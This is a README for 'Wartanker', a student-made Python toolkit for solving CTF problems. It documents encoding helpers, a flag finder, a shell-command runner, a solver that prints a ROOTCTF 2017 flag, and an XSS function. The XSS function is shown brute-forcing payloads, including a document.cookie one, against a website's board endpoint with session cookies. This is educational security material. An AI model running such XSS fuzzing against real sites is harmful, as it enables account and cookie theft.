# WARTANKER

서울여자대학교 정보보호영재교육원 중등심화 집중교육 3일차 프로젝트 : 엄서훈, 여준호

```python
>>> from wartanker import *
[*] Wartanker, the Python3 toolkit for solving CTF problems
```

<!-- wartanker.crypto -->
## `wartanker.crypto`

```python
>>> from wartanker import crypto
[*] Wartanker, the Python3 toolkit for solving CTF problems
```

### `wartanker.crypto.b16encode`

```python
>>> crypto.b16encode('flag{wartanker}')
'666C61677B77617274616E6B65727D'
>>> crypto.b16encode('flag{wartanker}', 'UTF-8')
'666C61677B77617274616E6B65727D'
>>> crypto.b16encode('flag{wartanker}', encoding='UTF-8')
'666C61677B77617274616E6B65727D'
```

`wartanker.crypto.b16encode`는 문자열을 `base16`으로 인코딩한 값을 `str` 형으로 반환합니다. 이것은 Python의 `base64` 모듈을 확장한 것으로, `str`형의 데이터를 인코딩할 때 `bytes`로 변환한 후 `decode()` 메소드를 호출하는 귀찮은 과정을 알아서 처리해 줍니다.

두 번째 인수이자 선택적 인수 `encoding`으로 문자열을 `bytes` 형으로 변환할 때 사용할 인코딩을 지정할 수 있습니다.

### `wartanker.crypto.b16decode`

```python
>>> crypto.b16decode('666C61677B77617274616E6B65727D')
'flag{wartanker}'
```

`wartanker.crypto.b16decode`는 `base16`으로 인코딩된 문자열을 디코딩한 값을 `str` 형으로 반환합니다.

### `wartanker.crypto.b32encode`

```python
>>> crypto.b32encode('flag{wartanker}')
'MZWGCZ33O5QXE5DBNZVWK4T5'
>>> crypto.b32encode('flag{wartanker}', 'UTF-8')
'MZWGCZ33O5QXE5DBNZVWK4T5'
```

`wartanker.crypto.b32encode`는 문자열을 `base32`으로 인코딩한 값을 `str` 형으로 반환합니다.

### `wartanker.crypto.b32decode`

```python
>>> crypto.b32decode('MZWGCZ33O5QXE5DBNZVWK4T5')
'flag{wartanker}'
```

`wartanker.crypto.b32decode`는 `base32`으로 인코딩된 문자열을 디코딩한 값을 `str` 형으로 반환합니다.

### `wartanker.crypto.b64encode`

```python
>>> crypto.b64encode('flag{wartanker}')
'ZmxhZ3t3YXJ0YW5rZXJ9'
>>> crypto.b64encode('flag{wartanker}', 'UTF-8')
'ZmxhZ3t3YXJ0YW5rZXJ9'
```

`wartanker.crypto.b64encode`는 문자열을 `base64`으로 인코딩한 값을 `str` 형으로 반환합니다.

### `wartanker.crypto.b64decode`

```python
>>> crypto.b64decode('ZmxhZ3t3YXJ0YW5rZXJ9')
'flag{wartanker}'
```

`wartanker.crypto.b64decode`는 `base64`으로 인코딩된 문자열을 디코딩한 값을 `str` 형으로 반환합니다.

### `wartanker.crypto.base_encode`

```python
>>> crypto.base_encode(16, 'flag{wartanker}')
'666C61677B77617274616E6B65727D'
>>> crypto.base_encode(32, 'flag{wartanker}')
'MZWGCZ33O5QXE5DBNZVWK4T5'
>>> crypto.base_encode(64, 'flag{wartanker}')
'ZmxhZ3t3YXJ0YW5rZXJ9'
>>> crypto.base_encode(64, 'flag{wartanker}', encoding='UTF-8')
'ZmxhZ3t3YXJ0YW5rZXJ9'
```

`wartanker.crypto.base_encode`는 `base`에 따라 문자열을 인코딩합니다. 역시 두 번째 선택적 인수 `encoding`을 통하여 인코딩을 지정할 수 있습니다.

### `wartanker.crypto.base_decode`

```python
>>> crypto.base_decode('ZmxhZ3t3YXJ0YW5rZXJ9', base=64)
'flag{wartanker}'
>>> crypto.base_decode('MZWGCZ33O5QXE5DBNZVWK4T5', base=32)
'flag{wartanker}'
>>> crypto.base_decode('666C61677B77617274616E6B65727D', base=16)
'flag{wartanker}'
```

`wartanker.crypto.base_decode`는 `base`에 따라 문자열을 디코딩한 값을 반환합니다.

```python
>>> crypto.base_decode('ZmxhZ3t3YXJ0YW5rZXJ9')
'flag{wartanker}'
>>> crypto.base_decode('MZWGCZ33O5QXE5DBNZVWK4T5')
'flag{wartanker}'
>>> crypto.base_decode('666C61677B77617274616E6B65727D')
'flag{wartanker}'
```

`base`가 지정되지 않은 경우, `b64decode`, `b32decode`, `b16decode`를 차례로 시도하여 자동으로 문자열을 디코딩합니다. 만약 어느 것으로도 디코딩할 수 없으면, `UnknownBaseError`를 raise합니다.

### `wartanker.crypto.str2hex`

### `wartanker.crypto.hex2str`

<!-- wartanker.forensic -->
## `wartanker.forensic`

```python
>>> from wartanker import forensic
[*] Wartanker, the Python3 toolkit for solving CTF problems
```

### `wartanker.forensic.get_fileinfo`

```python
>>> forensic.get_fileinfo('./examples/dump')
'./examples/dump: ASCII text'
```

파일에 대한 정보를 불러옵니다.

### `wartanker.forensic.find_flag`

```python
>>> from wartanker import forensic
[*] Wartanker, the Python3 toolkit for solving CTF problems
>>> forensic.find_flag('W4RT4NK3R', './examples/dump')
['W4RT4NK3R{fake}', 'W4RT4NK3R{real_flag}']
```

플래그 형식을 입력받아 파일에서의 검색 결과를 리스트로 반환합니다.

<!-- wartanker.hash -->
## `wartanker.hash`

### `wartanker.hash.sha256encode`

### `wartanker.hash.sha384encode`

### `wartanker.hash.sha512encode`

### `wartanker.hash.sha_encode`

### `wartanker.hash.md5encode`

<!-- wartanker.pwnable -->
## `wartanker.pwnable`

```python
>>> from wartanker import pwnable
[*] Wartanker, the Python3 toolkit for solving CTF problems
```

### `wartanker.pwnable.terminal`

```python
>>> from wartanker import pwnable
[*] Wartanker, the Python3 toolkit for solving CTF problems
>>> pwnable.terminal('id')
'uid=501(junhoyeo) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)'
```

커맨드를 터미널에서 실행하고 그 결과를 문자열로 반환합니다.

<!-- wartanker.reversing -->
## `wartanker.reversing`

### `wartanker.reversing.crypto_solver`

```python
>>> from wartanker import reversing
>>> f = '''
... def one(num, size):
...     r = num + size
...     r += 915
...     return r
...
... def two(num, size):
...     r = num - size
...     r -= 372
...     return r
...
... def three(num, size):
...     r = num ^ size
...     r ^= 826
...     return r
...
... def four(num, size):
...     size %= 32
...     r = num >> (32 - size)
...     b = (num << size) - (r << 32)
...     return b + r
... '''
>>> result = [5040, 4944, 5088, 4992, 7232, 4848, 7584, 7344, 4288, 7408, 7360, 7584, 4608, 4880, 4320, 7328,7360, 4608, 4896, 4320, 7472, 7328, 7360, 4608, 4752, 4368, 4848, 4608, 4848, 4368, 4944, 7200]
>>> reversing.crypto_solver('four(three(two(one(j, 100), 100), 100), 100)', result, functions=f)
'FLAG{Rev3rse_P1us_M1nus_X0R_R0L}'
```

Exploit of ROOTCTF 2017 prob `Calculate`

<!-- wartanker.web -->
## `wartanker.web`

### `wartanker.web.xss_exploit`
```python
>>> from wartanker import web
[*] Wartanker, the Python3 toolkit for solving CTF problems
>>> web.xss_exploit('post', 'https://www.uhmtoto.xyz/board/write.php', 'content', {}, {'user':'aa', 'PHPSESSID':'**************************'}, 'https://www.uhmtoto.xyz/
board/board')
[*] trying 0 of 68
[*] trying 1 of 68
[*] trying 2 of 68
[*] trying 3 of 68
[*] trying 4 of 68
[*] trying 5 of 68
[*] How about trying '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'?
[*] Do you want more? [Y / N] y
[*] trying 6 of 68
[*] trying 7 of 68
[*] How about trying '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'?
[*] Do you want more? [Y / N] y
[*] trying 8 of 68
[*] How about trying '<a onmouseover=alert(document.cookie)>xxs link</a>'?
[*] Do you want more? [Y / N] n
